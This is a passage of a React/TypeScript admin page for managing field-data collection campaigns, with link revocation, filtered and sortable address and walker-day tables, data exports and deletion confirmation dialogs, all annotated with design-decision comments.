                      <span className="block text-[11px] text-muted-foreground">
                        {/* Two different units, so never shown as a ratio:
                            submission_count is the campaign's LIFETIME total,
                            daily_cap is a per-day ceiling checked against a
                            same-day count the listing does not return. */}
                        {/* ADR-423. Which auth model this campaign uses, said
                            plainly: "open link" means the link IS the
                            credential and anyone holding it can submit, which
                            is a different thing to hand out than a company
                            link that also requires signing in. */}
                        <span className={t.scope === 'open' ? 'text-warning' : ''}>
                          {t.scope === 'open' ? 'open link' : 'company only'}
                        </span>
                        {' · '}
                        {t.submission_count} total · cap {t.daily_cap}/day
                        {dead && ' · revoked'}
                        {!dead && t.expires_at && ` · expires ${new Date(t.expires_at).toLocaleDateString()}`}
                        {t.created_by_name && ` · ${t.created_by_name}`}
                      </span>
                    </button>
                    {!dead && (
                      <button
                        onClick={() => void revoke(t)}
                        title="Revoke. Submissions stop immediately."
                        className="shrink-0 rounded-md p-1.5 text-muted-foreground opacity-0 hover:bg-danger/10 hover:text-danger focus:opacity-100 group-hover:opacity-100"
                      >
                        <Ban className="w-3.5 h-3.5" />
                      </button>
                    )}
                    {/* ADR-437. Cleanup appears only once the link is REVOKED,
                        mirroring the server's gate rather than offering a control that
                        would 409. Purging a live campaign races its collectors: rows land
                        seconds after the wipe and are indistinguishable from data meant to
                        survive. */}
                    {dead && (
                      <button
                        onClick={() => setCleanup({ token: t, mode: 'purge' })}
                        title="Clean up. Empty this campaign or remove it."
                        className="shrink-0 rounded-md p-1.5 text-muted-foreground opacity-0 hover:bg-danger/10 hover:text-danger focus:opacity-100 group-hover:opacity-100"
                      >
                        <Eraser className="w-3.5 h-3.5" />
                      </button>
                    )}
                  </li>
                );
              })}
            </ul>
          )}

          {/* The selected campaign's LINK, under the list and unambiguous about
              which campaign it belongs to (ADR-424). Shown for the selected
              campaign only: three links stacked in a sidebar is three chances
              to send the wrong one. */}
          {selected?.token && (
            <div className="rounded-lg border border-border bg-surface/60 p-2.5 space-y-1.5">
              <p className="text-[11px] font-semibold uppercase tracking-wide text-muted-foreground">
                Link for {selected.label}
              </p>
              <div className="flex items-center gap-1.5">
                <code className="min-w-0 flex-1 truncate rounded-md border border-border bg-card px-2 py-1.5 font-mono text-[11px]">
                  {selected.token}
                </code>
                <button
                  onClick={() => {
                    void navigator.clipboard.writeText(selected.token ?? '');
                    setCopied(true);
                    setTimeout(() => setCopied(false), 2000);
                  }}
                  className="btn-secondary shrink-0 px-2 py-1.5 text-xs inline-flex items-center gap-1"
                >
                  {copied ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
                  {copied ? 'Copied' : 'Copy'}
                </button>
              </div>
              <p className="text-[11px] text-muted-foreground">
                {selected.scope === 'open'
                  ? 'Anyone with this link can submit. Give it to collectors.'
                  : 'Only signed-in employees of your company can use this link.'}
              </p>
            </div>
          )}
        </aside>

        {/* ── Rows ─────────────────────────────────────────────────────── */}
        <section className="card p-4 space-y-3">
          <div className="flex items-start justify-between gap-3 flex-wrap">
            <div>
              <h2 className="text-sm font-semibold">
                {activeLabel ?? 'All campaigns'}
              </h2>
              <p className="text-[11px] text-muted-foreground">
                {/* When a filter is active the headline count must describe
                    what is ON SCREEN, not the campaign. A table showing 12 of
                    500 rows under a heading that still says 500 is how someone
                    reports the wrong number in a meeting. */}
                {dataset === 'addresses'
                  ? hasActiveFilters(filters)
                    ? `${visible.length} of ${profiles.length} addresses shown`
                    : `${profiles.length} address${profiles.length === 1 ? '' : 'es'} collected`
                  : `${days.length} walker day${days.length === 1 ? '' : 's'} collected`}
              </p>
              {/* ADR-433. What the campaign has actually LEARNED, which a raw
                  submission count cannot say: how many doors are verified
                  rather than seen once, and whether any need a third look.
                  Verified is the number that matters — ADR-420 treats a door as
                  known only at two observations. */}
              {dataset === 'addresses' && profiles.length > 0 && (
                <p className="mt-1 flex flex-wrap items-center gap-x-3 gap-y-1 text-[11px] text-muted-foreground">
                  <span>
                    <span className="font-medium text-foreground">
                      {progress.verified}
                    </span>
                    {' of '}
                    <span className="font-medium text-foreground">{progress.doors}</span>
                    {' doors verified'}
                  </span>
                  {progress.conflicts > 0 && (
                    <span className="inline-flex items-center gap-1 text-warning">
                      <AlertTriangle className="h-3 w-3" aria-hidden="true" />
                      {progress.conflicts} door{progress.conflicts === 1 ? '' : 's'}
                      {progress.conflicts === 1 ? ' needs' : ' need'} a third look
                    </span>
                  )}
                  <span>
                    {progress.collectors} collector{progress.collectors === 1 ? '' : 's'}
                  </span>
                </p>
              )}
            </div>
            <div className="flex items-center gap-2">
              {/* Two datasets, two views. Addresses describe a door and days
                  describe a shift, so one merged table would be half empty
                  whichever row you were looking at. */}
              <div className="flex rounded-lg bg-muted p-0.5 text-sm">
                {(['addresses', 'days'] as const).map((k) => (
                  <button
                    key={k}
                    onClick={() => { setDataset(k); setOpenDay(null); }}
                    className={`rounded-md px-2.5 py-1 ${
                      dataset === k ? 'bg-card shadow-sm font-medium' : 'text-muted-foreground'
                    }`}
                  >
                    {k === 'addresses' ? 'Addresses' : 'Days'}
                  </button>
                ))}
              </div>
            </div>
          </div>

          {/* ADR-434 D3. Its own row, in the walker log's Export idiom — a
              bordered panel with an uppercase title, a hint on the right, and
              buttons carrying their file extension. It sat inline with the
              Addresses/Days toggle, which put two unrelated jobs on one line
              (choosing what to LOOK at, and taking a file AWAY) and left the
              header cramped. One idiom for "take data out", in both places it
              appears. */}
          {((dataset === 'addresses' && profiles.length > 0)
            || (dataset === 'days' && days.length > 0)) && (
            <section className="rounded-xl border border-border bg-surface/40 p-3">
              <div className="mb-2 flex items-baseline justify-between gap-2">
                <h3 className="text-[11px] font-semibold uppercase tracking-[0.08em] text-muted-foreground">
                  Export
                </h3>
                {/* WHICH campaign, said out loud. "All campaigns" and a single
                    campaign produce very different files from an
                    identical-looking button. The export already followed the
                    selection; it simply never said so. */}
                <span className="text-[11px] text-muted-foreground/70">
                  {activeLabel ?? 'All campaigns'}
                  {' · '}
                  {dataset === 'addresses'
                    ? `${profiles.length} address${profiles.length === 1 ? '' : 'es'}`
                    : `${days.length} day${days.length === 1 ? '' : 's'}`}
                </span>
              </div>
              <div className="flex flex-wrap gap-1.5">
                {([
                  { fmt: 'xlsx', label: 'Excel', sub: '.xlsx' },
                  { fmt: 'csv',  label: 'CSV',   sub: '.csv'  },
                  { fmt: 'json', label: 'JSON',  sub: '.json' },
                ] as const).map((it) => (
                  <button
                    key={it.fmt}
                    type="button"
                    onClick={() => void download(it.fmt)}
                    disabled={downloading}
                    className="inline-flex min-w-0 items-center gap-1.5 rounded-lg border border-border bg-card px-2.5 py-1.5 text-sm hover:border-primary/60 hover:bg-muted focus:outline-none focus:ring-2 focus:ring-primary/40 disabled:opacity-50"
                  >
                    {/* Upload, not Download. lucide's Download arrow points
                        INTO a tray (receiving) and Upload points OUT of it
                        (sending) — so an EXPORT takes Upload. */}
                    <Upload
                      aria-hidden="true"
                      className={`h-4 w-4 shrink-0 text-muted-foreground ${downloading ? 'animate-pulse' : ''}`}
                    />
                    <span className="truncate">{it.label}</span>
                    <span className="shrink-0 text-[10px] text-muted-foreground/70">{it.sub}</span>
                  </button>
                ))}
              </div>
              {/* The filter note belongs on the control it is about: an export
                  takes the whole campaign, which is NOT what the filtered table
                  above is showing. Someone who filtered to "collectors
                  disagree" and then exported would otherwise reasonably expect
                  a file of just those. */}
              {hasActiveFilters(filters) && dataset === 'addresses' && (
                <p className="mt-2 text-[10px] text-muted-foreground/70">
                  Exports the whole campaign, not the filtered rows above.
                </p>
              )}
            </section>
          )}

          {loadingRows ? (
            <SkeletonCard />
          ) : dataset === 'days' ? (
            days.length === 0 ? (
              <p className="text-sm text-muted-foreground">No days submitted yet.</p>
            ) : (
              <div className="overflow-x-auto">
                <table className="w-full text-sm">
                  <thead>
                    <tr className="border-b border-border text-left text-[11px] uppercase tracking-wide text-muted-foreground">
                      <th className="py-2 pr-3 font-semibold">Walker</th>
                      <th className="py-2 pr-3 font-semibold">Date</th>
                      <th className="py-2 pr-3 font-semibold">Shift</th>
                      <th className="py-2 pr-3 font-semibold">Routes</th>
                      <th className="py-2 pr-3 font-semibold">Totes</th>
                      <th className="py-2 pr-3 font-semibold">RTS</th>
                      <th className="py-2 font-semibold">Submitted</th>
                    </tr>
                  </thead>
                  <tbody>
                    {days.map((d) => (
                      <Fragment key={d.id}>
                        <tr
                          onClick={() => void expandDay(d.id)}
                          className="cursor-pointer border-b border-border/50 align-top hover:bg-muted/50"
                        >
                          <td className="py-2 pr-3 font-medium">{d.walker_name}</td>
                          <td className="py-2 pr-3 whitespace-nowrap">{d.collected_on}</td>
                          <td className="py-2 pr-3 whitespace-nowrap text-muted-foreground">
                            {d.arrival_time || '—'}–{d.departure_time || '—'}
                          </td>
                          <td className="py-2 pr-3">{d.route_count}</td>
                          <td className="py-2 pr-3">{d.tote_count}</td>
                          <td className="py-2 pr-3">{d.rts_count}</td>
                          <td className="py-2 whitespace-nowrap text-muted-foreground">
                            {fmt(d.submitted_at)}
                            {/* A revision above 1 means the day was re-sent.
                                Worth showing: it separates a corrected day
                                from a first submission without a diff. */}
                            {d.revision > 1 && (
                              <span className="ml-1 rounded bg-muted px-1 text-[10px]">
                                rev {d.revision}
                              </span>
                            )}
                          </td>
                        </tr>
                        {openDay?.id === d.id && (
                          <tr className="border-b border-border/50 bg-muted/30">
                            <td colSpan={7} className="px-3 py-3">
                              <div className="space-y-3">
                                {(openDay.payload.routes ?? []).map((r) => (
                                  <div key={r.route_id} className="rounded-lg border border-border bg-card p-2.5">
                                    <p className="text-xs font-semibold">
                                      Route {r.route_id}
                                      <span className="ml-2 font-normal text-muted-foreground">
                                        {r.route_start || '—'}–{r.route_end || '—'}
                                        {/* Route times are stored HH:MM, so
                                            they need no reformatting — only
                                            the difficulty reads as a raw
                                            value. */}
                                        {r.difficulty && (
                                          <> · {r.difficulty[0].toUpperCase() + r.difficulty.slice(1)}</>
                                        )}
                                      </span>
                                    </p>
                                    {r.notes && (
                                      <p className="mt-1 text-[11px] text-muted-foreground">{r.notes}</p>
                                    )}
                                    {(r.totes ?? []).map((t, i) => (
                                      <div key={`${t.bag_id}-${i}`} className="mt-1.5 text-[11px]">
                                        <span className="font-medium">{t.bag_id || '(no bag id)'}</span>
                                        {t.stop && <span className="text-muted-foreground"> · {t.stop}</span>}
                                        {t.addresses?.length > 0 && (
                                          <span className="text-muted-foreground">
                                            {' — '}{t.addresses.join('; ')}
                                          </span>
                                        )}
                                      </div>
                                    ))}
                                    {(r.rts ?? []).length > 0 && (
                                      <p className="mt-1.5 text-[11px] text-warning">
                                        RTS: {r.rts.map((x) => `${x.tba || '?'} (${x.code || '?'})`).join(', ')}
                                      </p>
                                    )}
                                    {(r.ovs ?? []).length > 0 && (
                                      <p className="mt-1 text-[11px] text-muted-foreground">
                                        OVs: {r.ovs.map((o) => `${o.ov_id || '?'}${o.size ? ` ${o.size}` : ''}`).join(', ')}
                                      </p>
                                    )}
                                  </div>
                                ))}
                              </div>
                            </td>
                          </tr>
                        )}
                      </Fragment>
                    ))}
                  </tbody>
                </table>
              </div>
            )
          ) : profiles.length === 0 ? (
            /* ADR-433. "Nothing submitted yet" states a fact and leaves the
               reader to work out whether that is normal. The two reasons a
               campaign is empty need different answers, so they are told
               apart: there is no campaign to submit to, or there is one and
               nobody has used the link.

               Deliberately not an illustration or a big empty-state block —
               this is a panel inside a working page, not a first-run screen. */
            <div className="space-y-1.5 py-2">
              <p className="text-sm font-medium">Nothing submitted yet.</p>
              <p className="text-xs text-muted-foreground">
                {tokens.length === 0
                  ? 'Create a campaign on the left, then share its link with collectors. Submissions appear here as they arrive.'
                  : 'The campaign is live. Copy its link from the list on the left and send it to collectors. The first submission shows up here.'}
              </p>
            </div>
          ) : (
          <>
            {/* ADR-432. Filters above the table, active ones visibly pressed
                with one clear — the enterprise-table rule. A filtered table
                that does not LOOK filtered is worse than an unfiltered one,
                because it produces confident wrong readings. */}
            <div className="flex flex-wrap items-center gap-2 text-xs">
              <ChipSelect
                label="Type" value={filters.buildingType}
                options={typeOptions.map((v) => ({ value: v, label: buildingTypeLabel(v) }))}
                onChange={(v) => setFilters((f) => ({ ...f, buildingType: v }))}
              />
              <ChipSelect
                label="Workload" value={filters.workload}
                options={workloadOptions.map((v) => ({ value: v, label: workloadLabels([v]) }))}
                onChange={(v) => setFilters((f) => ({ ...f, workload: v }))}
              />
              <ChipSelect
                label="State" value={filters.state}
                options={[
                  { value: 'open',    label: 'Still open' },
                  { value: 'closed',  label: 'Verified' },
                  { value: 'differs', label: 'Collectors disagree' },
                ]}
                onChange={(v) => setFilters((f) => ({ ...f, state: v }))}
              />

              {hasActiveFilters(filters) && (
                <button
                  type="button"
                  onClick={() => setFilters(NO_FILTERS)}
                  className="inline-flex items-center gap-1.5 rounded-full border border-input bg-background px-3 py-1.5 text-xs text-muted-foreground shadow-sm transition-colors hover:border-primary hover:text-foreground focus:outline-none focus:ring-1 focus:ring-primary"
                >
                  <X className="h-3 w-3" aria-hidden="true" /> Clear filters
                </button>
              )}

              {/* One door per row, or one submission per row. Both are useful
                  and neither is always right, so it is a toggle rather than a
                  replacement (ADR-432 D2). */}
              <button
                type="button"
                onClick={() => { setGrouped((g) => !g); setOpenDoor(null); }}
                aria-pressed={grouped}
                className={`ml-auto inline-flex items-center gap-1.5 rounded-full border px-3 py-1.5 text-xs shadow-sm transition-colors focus:outline-none focus:ring-1 focus:ring-primary ${
                  grouped
                    ? 'border-primary bg-primary/10 text-primary'
                    : 'border-input bg-background text-muted-foreground hover:border-primary hover:text-foreground'
                }`}
              >
                <Rows3 className="h-3 w-3" aria-hidden="true" />
                Group by door
              </button>
            </div>

            {/* ADR-432 D4. The aggregates below are computed over what was
                fetched. Said plainly at the one moment it stops being the whole
                campaign, rather than letting the page quietly describe a
                subset. */}
            {atFetchLimit && (
              <p className="flex items-start gap-1.5 rounded-lg bg-warning/10 p-2 text-[11px] text-warning">
                <AlertTriangle className="mt-px h-3 w-3 shrink-0" aria-hidden="true" />
                Showing the first 1000 submissions. Counts and grouping below
                describe those rows, not the whole campaign.
              </p>
            )}

            {visible.length === 0 ? (
              <p className="text-sm text-muted-foreground">
                No addresses match these filters.
              </p>
            ) : (
            /* Scrolls inside its own container — a wide table must never make
               the page scroll sideways. */
            <div className="overflow-x-auto">
              <table className="w-full text-sm">
                <thead>
                  <tr className="border-b border-border text-left text-[11px] uppercase tracking-wide text-muted-foreground">
                    {/* ADR-432 D3 — the WAI-ARIA sortable-table pattern, not an
                        approximation of it. aria-sort sits on the th (never on
                        the inner control), exactly one column carries it at a
                        time, the label is a real <button> so it is reachable by
                        keyboard, and the chevron is aria-hidden so it cannot
                        pollute the button's accessible name.

                        This is the repo's first aria-sort. Getting it right
                        once matters more than usual: the next sortable table
                        will be copied from this one. */}
                    <SortableTh label="Address"   col="address"       {...sortProps} />
                    <SortableTh label="Type"      col="building_type" {...sortProps} />
                    <th className="py-2 pr-3 font-semibold">Workload</th>
                    <th className="py-2 pr-3 font-semibold">Hours</th>
                    <SortableTh label="By"        col="collected_by"  {...sortProps} />
                    <SortableTh label="Collected" col="collected_on"  {...sortProps} />
                    {/* No header text: an icon-only action column reads as
                        chrome, and "Actions" would be the widest thing in a
                        column holding one 12px button. */}
                    <th className="py-2 font-semibold"><span className="sr-only">Actions</span></th>
                  </tr>
                </thead>
                <tbody>
                  {/* ADR-430. Rows that describe ONE door, marked.
                      
                      Two observations close a door to new collectors
                      (ADR-420), and the flat table gave the reader no way to
                      tell — a verified door and a door still wanting a second
                      look were identical rows. The count is computed from
                      door_key rather than fetched: the listing already carries
                      every row it is counting. */}
                  {/* `visible`, not `profiles` — the map must render what the
                      filters and sort produced. Iterating the raw list here
                      would leave a filter bar that visibly changes nothing,
                      which reads as a broken control rather than an empty
                      result. */}
                  {grouped && doors.map((door) => {
                    const isOpen = openDoor === door.key;
                    const head = door.observations[0];
                    return (
                      <Fragment key={door.key}>
                        <tr
                          className="border-b border-border/50 align-top cursor-pointer hover:bg-muted/40"
                          onClick={() => setOpenDoor(isOpen ? null : door.key)}
                        >
                          <td className="py-2 pr-3">
                            <span className="flex items-center gap-1.5">
                              <button
                                type="button"
                                aria-expanded={isOpen}
                                aria-label={`${isOpen ? 'Hide' : 'Show'} the ${door.observations.length} observations of ${door.address}`}
                                className="rounded text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary/40"
                                onClick={(e) => { e.stopPropagation(); setOpenDoor(isOpen ? null : door.key); }}
                              >
                                {isOpen
                                  ? <ChevronDown className="h-3.5 w-3.5" />
                                  : <ChevronRight className="h-3.5 w-3.5" />}
                              </button>
                              <span className="font-medium">{door.address}</span>
                            </span>
                          </td>
                          {/* The door's TYPE is shown only when its observations
                              agree. Printing one of two conflicting values would
                              silently pick a winner, which is exactly the
                              judgement this view exists to hand to a human. */}
                          <td className="py-2 pr-3">
                            {door.state === 'differs'
                              ? '—'
                              : buildingTypeLabel(head.building_type)}
                          </td>
                          <td className="py-2 pr-3" colSpan={2}>
                            {/* The one row worth acting on gets the only
                                colour. `agreed` and `single` are ordinary
                                states and are left quiet, so `differs` is
                                findable by eye down a long table. */}
                            {door.state === 'differs' ? (
                              <span className="inline-flex items-center gap-1 rounded bg-warning/15 px-1.5 py-0.5 text-[10px] text-warning">
                                <AlertTriangle className="h-3 w-3" aria-hidden="true" />
                                collectors disagree
                              </span>
                            ) : door.state === 'agreed' ? (
                              <span className="text-[11px] text-muted-foreground">agreed by both</span>
                            ) : (
                              <span className="text-[11px] text-muted-foreground">one observation</span>
                            )}
                          </td>
                          <td className="py-2 pr-3 text-muted-foreground">
                            {[...new Set(door.observations.map((o) => o.collected_by).filter(Boolean))].join(', ') || '—'}
                          </td>
                          <td className="py-2 pr-3 whitespace-nowrap text-muted-foreground">
                            {door.observations.length} observation{door.observations.length === 1 ? '' : 's'}
                          </td>
                          <td />
                        </tr>
                        {isOpen && door.observations.map((o) => (
                          <tr key={o.id} className="border-b border-border/50 bg-muted/20 text-[11px]">
                            <td className="py-1.5 pl-8 pr-3 text-muted-foreground">
                              {o.collected_on}
                            </td>
                            <td className="py-1.5 pr-3">{buildingTypeLabel(o.building_type)}</td>
                            <td className="py-1.5 pr-3">{workloadLabels(o.workloads) || '—'}</td>
                            <td className="py-1.5 pr-3 text-muted-foreground">
                              {formatHours(o.opens_at, o.closes_at) || '—'}
                            </td>
                            <td className="py-1.5 pr-3 text-muted-foreground">{o.collected_by ?? '—'}</td>
                            <td className="py-1.5 pr-3 text-muted-foreground">{fmt(o.submitted_at)}</td>
                            {/* Delete stays on the OBSERVATION, never on the
                                door: ADR-431 removes one person's submission,
                                and a control on the parent row would destroy
                                several at once. */}
                            <td className="py-1.5 text-right">
                              <button
                                type="button"
                                onClick={() => setToDelete(o)}
                                disabled={deleting}
                                title="Delete this observation"
                                aria-label={`Delete the observation for ${o.address} collected on ${o.collected_on}`}
                                className="rounded p-1 text-muted-foreground transition-colors hover:bg-danger/10 hover:text-danger focus:outline-none focus:ring-2 focus:ring-danger/40 disabled:opacity-50"
                              >
                                <Trash2 className="h-3 w-3" />
                              </button>
                            </td>
                          </tr>
                        ))}
                      </Fragment>
                    );
                  })}
                  {!grouped && visible.map((p) => {
                    // Server-computed (ADR-430). Counting matching door_keys in
                    // `profiles` would be wrong the moment a campaign exceeds
                    // one page: a pair split across the boundary would read as
                    // two single observations, and the count would be right
                    // only for small campaigns.
                    const closed = p.closed;
                    return (
                    <tr key={p.id} className="border-b border-border/50 align-top">
                      <td className="py-2 pr-3">
                        <span className="flex items-center gap-1.5">
                          <span>{p.address}</span>
                          {/* A lock, not a colour: "closed" is a state of the
                              door, not a warning about the row, and colouring
                              the whole line would compete with `troublesome`
                              which genuinely is a warning. */}
                          {closed && (
                            <Lock
                              className="h-3 w-3 shrink-0 text-muted-foreground"
                              aria-label="Closed to new observations"
                            />
                          )}
                        </span>
                        {p.note && (
                          <span className="block text-[11px] text-muted-foreground">{p.note}</span>
                        )}
                        {p.troublesome && (
                          <span className="mt-0.5 inline-block rounded bg-warning/15 px-1.5 py-0.5 text-[10px] text-warning">
                            troublesome
                          </span>
                        )}
                      </td>
                      {/* ADR-429. LABELS, not stored values. The collector
                          chose "Loading dock: mailroom" from a list; showing
                          the admin `loading_dock_mailroom` back is the wire
                          format leaking into a reading surface.
                          buildingTypeLabel has existed since ADR-422 and this
                          page never called it. */}
                      <td className="py-2 pr-3">
                        <span className="block whitespace-nowrap">
                          {buildingTypeLabel(p.building_type)}
                        </span>
                        {/* The flag was collected and never displayed. It
                            changes what a walker must carry, which makes it
                            one of the more consequential things on the row. */}
                        {p.has_security_desk && (
                          <span className="mt-0.5 inline-block rounded bg-muted px-1.5 py-0.5 text-[10px] text-muted-foreground">
                            security desk
                          </span>
                        )}
                      </td>
                      <td className="py-2 pr-3">
                        {/* The collected SET, not workload_class — that column
                            is a single derived default (ADR-418), so showing it
                            here hid the second and third things the collector
                            actually ticked. */}
                        <span className="block">
                          {workloadLabels(p.workloads) || '—'}
                        </span>
                        {p.workload_other && (
                          <span className="block text-[11px] text-muted-foreground">
                            {p.workload_other}
                          </span>
                        )}
                      </td>
                      <td className="py-2 pr-3 whitespace-nowrap text-muted-foreground">
                        {formatHours(p.opens_at, p.closes_at) || '—'}
                        {(p.break_start || p.break_end) && (
                          <span className="block text-[11px]">
                            closed {formatHours(p.break_start, p.break_end)}
                          </span>
                        )}
                      </td>
                      <td className="py-2 pr-3 whitespace-nowrap text-muted-foreground">
                        {p.collected_by ?? '—'}
                        {/* ADR-435. Offered where a junk row is actually
                            SPOTTED. Only with one campaign selected and a known
                            device: against "All campaigns" this would read as
                            "remove this spammer everywhere" while the endpoint
                            is per-campaign, and a destructive control that does
                            less than it appears to is worse than none. */}
                        {activeToken && p.device_id && (
                          <button
                            type="button"
                            onClick={() => setPurgeDevice({
                              device: p.device_id!,
                              rows: profiles.filter((x) => x.device_id === p.device_id).length,
                            })}
                            disabled={deleting}
                            className="ml-1.5 rounded text-[10px] text-muted-foreground/60 underline decoration-dotted transition-colors hover:text-danger focus:outline-none focus:ring-2 focus:ring-danger/40 disabled:opacity-50"
                          >
                            remove all
                          </button>
                        )}
                      </td>
                      <td className="py-2 pr-3 whitespace-nowrap text-muted-foreground">
                        {p.collected_on}
                        <span className="block text-[11px]">{fmt(p.submitted_at)}</span>
                        {/* Which of the door's observations this row is. Says
                            "1 of 2" rather than just "closed", so a reader can
                            see the pair rather than two unrelated rows. */}
                        <span className="mt-0.5 block text-[10px]">
                          {closed
                            ? `closed · ${p.observations} observations`
                            : 'open · 1 more wanted'}
                        </span>
                      </td>
                      {/* ADR-431. Delete, and deliberately no edit beside it:
                          this table records what collectors actually
                          submitted, and an admin retyping a value would make
                          the row a claim about two people while still reading
                          as one. A wrong value is fixed by the collector
                          resubmitting (ADR-426).

                          Quiet by default and red only on hover. UX Movement:
                          reserve red for the confirmation itself — a row of
                          permanently red buttons in a table draws the eye to
                          the one action nobody should take casually. */}
                      <td className="py-2 text-right">
                        <button
                          type="button"
                          onClick={() => setToDelete(p)}
                          disabled={deleting}
                          title="Delete this observation"
                          aria-label={`Delete the observation for ${p.address}`}
                          className="rounded p-1.5 text-muted-foreground transition-colors hover:bg-danger/10 hover:text-danger focus:outline-none focus:ring-2 focus:ring-danger/40 disabled:opacity-50"
                        >
                          <Trash2 className="h-3.5 w-3.5" />
                        </button>
                      </td>
                    </tr>
                    );
                  })}
                </tbody>
              </table>
            </div>
            )}
          </>
          )}
        </section>
      </div>

      {/* NAMES THE ADDRESS, and says plainly that it cannot be undone.
          ADR-431 D2 rejected a typed confirmation ("type DELETE"): NN/g
          reserves that for the most dangerous and RARE actions, and removing a
          test submission from a 30-day survey is neither — the friction would
          be trained away on exactly the person who deletes most. The address is
          what catches the real error. */}
      {/* ADR-437 D4. Its own dialog rather than ConfirmDialog: that component
          takes a plain-string message and cannot host the typed confirmation,
          and widening it for one caller would give every other confirm a mode
          it does not want.

          A typed confirmation IS warranted here, where ADR-431 D2 rejected one
          for a single row. NN/g reserves it for the most dangerous and RARE
          actions: this destroys weeks of field work that cannot be re-walked,
          happens a handful of times ever, and takes every row rather than one.
          The counts are stated because "412 addresses and 18 logged days" is
          what makes the decision, not the campaign's name. */}
      {cleanup && (
        <div
          role="dialog"
          aria-modal="true"
          aria-labelledby="cleanup-title"
          className="fixed inset-0 z-50 flex items-center justify-center p-4"
        >
          <div
            aria-hidden="true"
            className="absolute inset-0 bg-black/40"
            onClick={closeCleanup}
          />
          <div className="relative w-full max-w-md rounded-xl border border-border bg-card p-4 shadow-lg">
            <h2 id="cleanup-title" className="text-sm font-semibold">
              {cleanup.mode === 'purge' ? 'Empty this campaign?' : 'Delete this campaign?'}
            </h2>
            <p className="mt-1.5 text-xs text-muted-foreground">
              {cleanup.mode === 'purge'
                ? `Removes every address and logged day from ${cleanup.token.label}. The campaign and its link history stay, so the record that it ran survives.`
                : `Removes ${cleanup.token.label} and everything collected under it.`}
              {' Export first if the data has not been migrated. This cannot be undone.'}
            </p>

            {/* The two actions are one dialog, because the reader is deciding
                BETWEEN them — and seeing "the campaign stays" next to "the
                campaign goes" is what makes the difference legible. */}
            <div className="mt-3 flex gap-1.5 text-xs">
              {(['purge', 'delete'] as const).map((m) => (
                <button
                  key={m}
                  type="button"
                  onClick={() => setCleanup({ ...cleanup, mode: m })}
                  aria-pressed={cleanup.mode === m}
                  className={`rounded-full border px-3 py-1.5 transition-colors ${
                    cleanup.mode === m
                      ? 'border-primary bg-primary/10 text-primary'
                      : 'border-input bg-background text-muted-foreground hover:border-primary'
                  }`}
                >
                  {m === 'purge' ? 'Empty it' : 'Delete it'}
                </button>
              ))}
            </div>

            <label className="mt-3 block text-[11px] font-semibold uppercase tracking-wide text-muted-foreground">
              Type the campaign name to confirm
            </label>
            <input
              ref={cleanupInputRef}
              value={cleanupTyped}
              onChange={(e) => setCleanupTyped(e.target.value)}
              placeholder={cleanup.token.label}
              className="mt-1 w-full rounded-lg border border-input bg-background px-3 py-2 text-sm focus:outline-none focus:ring-1 focus:ring-primary"
            />

            <div className="mt-4 flex justify-end gap-2">
              <button
                type="button"
                onClick={closeCleanup}
                className="rounded-lg border border-input bg-background px-3 py-1.5 text-sm hover:border-primary"
              >
                Keep it
              </button>
              <button
                type="button"
                onClick={() => void runCleanup()}
                disabled={deleting || cleanupTyped.trim() !== cleanup.token.label}
                className="rounded-lg bg-danger px-3 py-1.5 text-sm text-white transition-opacity disabled:opacity-40"
              >
                {cleanup.mode === 'purge' ? 'Empty it' : 'Delete it'}
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Names the DEVICE and the count, and says the campaign is the limit of
          the blast radius — the two facts that decide whether this is safe to
          press. ADR-435. */}
      <ConfirmDialog
        open={purgeDevice !== null}
        variant="danger"
        title="Remove every row from this device?"
        message={
          purgeDevice
            ? `${purgeDevice.rows} row${purgeDevice.rows === 1 ? '' : 's'} submitted by device `
              + `${purgeDevice.device.slice(0, 12)}… in ${activeLabel ?? 'this campaign'}. `
              + 'Other campaigns and other collectors are not affected. This cannot be undone.'
            : ''
        }
        confirmLabel="Remove them"
        cancelLabel="Keep them"
        onConfirm={confirmPurge}
        onCancel={() => setPurgeDevice(null)}
      />

      <ConfirmDialog
        open={toDelete !== null}
        variant="danger"
        title="Delete this observation?"
        message={
          toDelete
            ? `${toDelete.address}, collected by ${toDelete.collected_by ?? 'an anonymous collector'}`
              + ` on ${toDelete.collected_on}. This cannot be undone, and field work cannot be re-walked.`
            : ''
        }
        confirmLabel="Delete it"
        cancelLabel="Keep it"
        onConfirm={confirmDelete}
        onCancel={() => setToDelete(null)}
      />
    </div>
  );
}
